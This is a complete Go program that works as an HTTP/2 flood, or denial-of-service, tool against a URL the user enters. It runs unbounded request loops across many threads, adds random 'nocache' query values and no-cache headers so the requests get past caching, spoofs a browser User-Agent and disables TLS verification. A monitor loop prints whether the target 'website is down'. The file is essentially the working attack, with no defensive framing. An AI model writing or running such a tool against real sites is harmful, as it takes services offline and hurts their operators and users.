package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"math/rand"
	"net/http"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"golang.org/x/net/http2"
)

func main() {
	reader := bufio.NewReader(os.Stdin)
	fmt.Print("Enter HTTP method (HEAD or GET): ")
	method, _ := reader.ReadString('\n')
	method = strings.ToUpper(strings.TrimSpace(method))

	fmt.Print("Enter URL: ")
	url, _ := reader.ReadString('\n')
	url = strings.TrimSpace(url)

	fmt.Print("Enter number of threads: ")
	threadBytes, _, _ := reader.ReadLine()
	numThreads, _ := strconv.Atoi(strings.TrimSpace(string(threadBytes)))

	var wg sync.WaitGroup
	wg.Add(numThreads)

	tr := &http2.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}

	for i := 0; i < numThreads; i++ {
		go func() {
			defer wg.Done()

			for {
				// Generate a unique query string to bypass caching
				randomValue := rand.Intn(1000000)
				bypassURL := fmt.Sprintf("%s?nocache=%d", url, randomValue)

				req, _ := http.NewRequest(method, bypassURL, nil)
				req.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
				req.Header.Set("Pragma", "no-cache")
				req.Header.Set("Expires", "0")
				req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537")

				client.Do(req)
			}
		}()
	}

	go func() {
		reqStatus, _ := http.NewRequest(method, url, nil)
		reqStatus.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537")

		for {
			time.Sleep(10 * time.Second)
			start := time.Now()
			_, err := client.Do(reqStatus)
			duration := time.Since(start)
			if err != nil {
				fmt.Println("Website is down")
			} else {
				fmt.Printf("Website is up ( %.2f ms)\n", float64(duration.Milliseconds()))
			}
		}
	}()

	wg.Wait()
}
